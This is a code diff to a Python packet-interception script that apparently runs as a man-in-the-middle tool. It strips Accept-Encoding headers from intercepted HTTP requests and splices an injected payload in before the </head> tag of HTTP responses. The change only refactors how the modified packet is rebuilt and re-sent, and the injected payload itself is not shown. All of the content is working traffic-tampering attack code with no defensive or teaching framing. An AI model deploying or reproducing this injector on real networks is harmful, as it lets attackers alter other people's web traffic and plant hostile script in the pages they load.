@@ -22,18 +22,19 @@ def process_packet(packet):
     
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
+        load = scapy_packet[Raw].load
         if scapy_packet[TCP].dport == 80:
             print("[+] HTTP Request")
-            mod_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[Raw].load)
-            mod_packet = set_load(scapy_packet, mod_load)
-            packet.set_payload(bytes(mod_packet))
+            load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)
             print(scapy_packet.show())
         elif scapy_packet[TCP].sport == 80:
             print("[+] HTTP Response")
-            mod_load = scapy_packet[Raw].load.replace(b"</head>", payload)
-            mod_packet = set_load(scapy_packet, mod_load)
-            packet.set_payload(bytes(mod_packet))
+            load = load.replace(b"</head>", payload)
             print(scapy_packet.show())
+    
+        if load != scapy_packet[Raw].load:
+            mod_packet = set_load(scapy_packet, load)
+            packet.set_payload(bytes(mod_packet))
     
     packet.accept()
 
